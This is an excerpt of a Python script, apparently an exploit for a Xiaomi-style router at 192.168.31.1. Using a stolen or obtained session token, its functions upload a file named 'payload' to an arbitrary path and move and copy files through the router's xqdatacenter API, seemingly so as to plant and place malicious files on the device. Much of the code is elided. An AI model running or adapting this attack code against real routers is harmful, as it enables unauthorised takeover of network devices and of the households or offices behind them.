...
def main():
    ...
    # Sessi '1387acc0547bc5188bc22bb811b2db9c'
    print('++++++++++++++++++++++++++++++++++++++++++++++++++')
...
def upload(Session, file, fpath):
    MiUrl = 'http://192.168.31.1/upload?stok=' + Session + \
        '&secret=' + Session + '&target=' + fpath + '&targetRootPath=/'
    files = {'file': ('payload', open(file, 'rb'),
...
def filemv(Session, mfile, dist):
    MiUrl = 'http://192.168.31.1/cgi-bin/luci/;stok=' + \
        Session + '/api/xqdatacenter/request'
    data = {"payload": '{"api":50,"source":"' + mfile +
            '","target":"' + dist + '","token":"' + Session + '"}'}
...
def filecp(Session, mfile, distdir):
    MiUrl = 'http://192.168.31.1/cgi-bin/luci/;stok=' + \
        Session + '/api/xqdatacenter/request'
    data = {"payload": '{"api":4,"source":"' + mfile +
            '","target":"' + distdir + '","token":"' + Session + '"}'}
    req = requests.post(MiUrl, data=data)
    #print (req.content)
